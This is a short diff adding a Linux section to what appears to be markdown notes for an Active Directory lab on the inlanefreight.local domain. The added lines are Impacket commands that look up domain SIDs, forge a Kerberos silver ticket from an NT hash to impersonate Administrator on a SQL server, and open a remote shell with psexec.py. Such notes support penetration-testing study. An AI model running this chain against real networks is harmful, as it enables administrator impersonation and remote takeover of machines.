@@ -59,3 +59,13 @@ dir //sql01.inlanefreight.local/c$
 
 .\PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
 ```
+
+### Linux
+```bash
+lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
+
+ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
+
+export KRB5CCNAME=./Administrator.ccache
+
+psexec.py -k -no-pass sql01.inlanefreight.local```
